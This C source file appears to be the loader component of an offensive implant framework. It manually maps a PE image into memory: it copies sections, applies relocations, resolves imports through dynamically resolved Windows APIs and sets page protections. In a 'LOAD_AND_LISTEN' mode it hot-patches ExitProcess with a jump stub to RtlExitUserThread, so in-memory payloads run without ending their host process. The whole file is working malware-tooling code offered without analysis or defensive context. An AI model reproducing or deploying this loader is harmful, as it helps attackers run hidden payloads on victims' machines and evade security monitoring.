#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/loader/loader.h"
#include "../../includes/comms/comms.h"
#include "../../includes/parser/parser.h"

#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif




BOOL HasReloc(PBYTE pe) {
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe + ((PIMAGE_DOS_HEADER)pe)->e_lfanew);
    if (nt->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
        return FALSE;
    return nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0;
}

DWORD SectionCharsToProt(DWORD chars) {
    DWORD exec  = chars & IMAGE_SCN_MEM_EXECUTE;
    DWORD read  = chars & IMAGE_SCN_MEM_READ;
    DWORD write = chars & IMAGE_SCN_MEM_WRITE;

    if (exec && read && write) return PAGE_EXECUTE_READWRITE;
    if (exec && read)          return PAGE_EXECUTE_READ;
    if (exec && write)         return PAGE_EXECUTE_WRITECOPY;
    if (exec)                  return PAGE_EXECUTE;
    if (read && write)         return PAGE_READWRITE;
    if (read)                  return PAGE_READONLY;
    if (write)                 return PAGE_WRITECOPY;
    return PAGE_NOACCESS;
}

void LdrCopySections(PVOID Base, PBYTE Raw, PIMAGE_SECTION_HEADER sec, WORD numSections) {
	DBGA("[+] Copying Sections\n");
    for (DWORD i = 0; i < numSections; i++) {
        LdrMemcpy(
            (PBYTE)Base + sec[i].VirtualAddress,
            Raw + sec[i].PointerToRawData,
            sec[i].SizeOfRawData
        );
    }
}

BOOL LdrProcessRelocs(PVOID Base, PBYTE Raw) {
	DBGA("[+] Handling reloc\n");

    PIMAGE_DATA_DIRECTORY relocDir = &OPT_HEADER(Raw)->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (!relocDir->VirtualAddress)
        return FALSE;

    ULONG_PTR delta = (ULONG_PTR)Base - OPT_HEADER(Raw)->ImageBase;
    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)Base + relocDir->VirtualAddress);

    while (reloc->VirtualAddress) {
        DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD entries = (PWORD)(reloc + 1);

        for (DWORD i = 0; i < numEntries; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;

            if (type == IMAGE_REL_TYPE) {
                ULONG_PTR *patch = (ULONG_PTR *)((PBYTE)Base + reloc->VirtualAddress + offset);
                *patch += delta;
            }
        }

        reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
    }

    return TRUE;
}

void LdrProcessIAT(PVOID Base, PBYTE Raw) {
	DBGA("[+] Handling IAT\n");

    PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(Raw)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (!importDir->VirtualAddress)
        return;

    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, Base, importDir->VirtualAddress);

    for (; pImportDesc->Name != 0; ++pImportDesc) {
        PCHAR ImportName = RVA2VA(PCHAR, Base, pImportDesc->Name);
        HMODULE ModuleImport = ldr->win32->LoadLibraryA(ImportName);

        PIMAGE_THUNK_DATA OrgTd = RVA2VA(PIMAGE_THUNK_DATA, Base, pImportDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA FirstTd = RVA2VA(PIMAGE_THUNK_DATA, Base, pImportDesc->FirstThunk);

        for (; OrgTd->u1.AddressOfData != 0; ++OrgTd, ++FirstTd) {
            if (IMAGE_SNAP_BY_ORDINAL(OrgTd->u1.Ordinal)) {
                FirstTd->u1.Function = (ULONG_PTR)ldr->win32->GetProcAddress(ModuleImport, (LPCSTR)IMAGE_ORDINAL(OrgTd->u1.Ordinal));
            } else {
                PIMAGE_IMPORT_BY_NAME pImportName = RVA2VA(PIMAGE_IMPORT_BY_NAME, Base, OrgTd->u1.AddressOfData);
                FirstTd->u1.Function = (ULONG_PTR)ldr->win32->GetProcAddress(ModuleImport, pImportName->Name);
            }
        }
    }
}

void LdrSetSectionPerms(PVOID Base, PIMAGE_SECTION_HEADER sec, WORD numSections) {
	DBGA("[+] Handling Section perms\n");

    for (DWORD i = 0; i < numSections; i++) {
        PVOID secMemory = (PBYTE)Base + sec[i].VirtualAddress;
        SIZE_T secSize = sec[i].SizeOfRawData;
        ULONG old = 0;

        DWORD prot = SectionCharsToProt(sec[i].Characteristics);
        ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &secMemory, &secSize, prot, &old);
    }

    ldr->win32->NtFlushInstructionCache(CurrentProcess(), NULL, 0);
}


#ifdef LOAD_AND_LISTEN
void LdrPatchExitProcess(void) {
    if (ldr->ExitProcessPatched)
        return;

    DBGA("[+] Patching ExitProcess\n");

    FARPROC pExit = ldr->win32->GetProcAddress(ldr->modules->kernel32, "ExitProcess");
    if (!pExit) {
        DBGA("[!] Failed Finding ExitProcess\n");
        return;
    }

    PVOID addr = (PVOID)pExit;
    SIZE_T size = 16;
    ULONG old = 0;
    if (!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &addr, &size, PAGE_EXECUTE_READWRITE, &old))) {
        DBGA("[!] Failed protecting ExitProcess\n");
        return;
    }

    // mov rax, imm64 ; jmp rax
    BYTE stub[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
    *(ULONG_PTR *)(stub + 2) = (ULONG_PTR)ldr->win32->RtlExitUserThread;
    LdrMemcpy((PVOID)pExit, stub, sizeof(stub));

    addr = (PVOID)pExit;
    size = 16;
    ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &addr, &size, old, &old);

    ldr->win32->NtFlushInstructionCache(CurrentProcess(), NULL, 0);
    ldr->ExitProcessPatched = TRUE;
    DBGA("[*] ExitProcess hooked -> RtlExitUserThread\n");
}

static VOID CALLBACK MemRunCallback(PVOID param, BOOLEAN timedOut) {
    LdrMemContext *ctx = (LdrMemContext *)param;
    PVOID Base = ctx->BaseAddress;

    PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(Base)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->VirtualAddress) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, Base, importDir->VirtualAddress);
        for (; pImport->Name; pImport++) {
            PCHAR name = RVA2VA(PCHAR, Base, pImport->Name);
            HMODULE hMod = ldr->win32->LoadLibraryA(name);  
            ldr->win32->FreeLibrary(hMod);                 
            ldr->win32->FreeLibrary(hMod);                   
        }
    }

    SIZE_T size = 0;
    ldr->win32->NtFreeVirtualMemory(CurrentProcess(), &ctx->BaseAddress, &size, MEM_RELEASE);
    ldr->win32->LocalFree(ctx);
}
#endif